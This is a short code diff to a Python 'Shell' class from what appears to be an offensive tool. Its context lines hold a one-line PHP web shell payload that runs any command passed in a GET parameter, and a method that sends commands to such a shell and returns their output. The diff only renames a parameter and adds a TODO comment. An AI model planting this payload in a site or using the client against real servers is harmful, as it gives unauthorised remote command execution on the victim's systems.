@@ -11,9 +11,9 @@ class Shell:
     PAYLOAD = '<?php echo shell_exec($_GET["cmd"]); ?>'
 
     @staticmethod
-    def execute(url, cmd):
+    def execute(shell_url, cmd):
         """ Execute shell command through web shell and return command output """
-        res = requests.get(url, params={'cmd': cmd})
+        res = requests.get(shell_url, params={'cmd': cmd})
 
         if res.status_code == 200:
             output = res.text
@@ -21,6 +21,7 @@ class Shell:
             return output
 
         elif res.status_code == 404:
+            # TODO: remove shell URL from cache if cache enabled
             Logger.error('web shell not found')
 
     @staticmethod
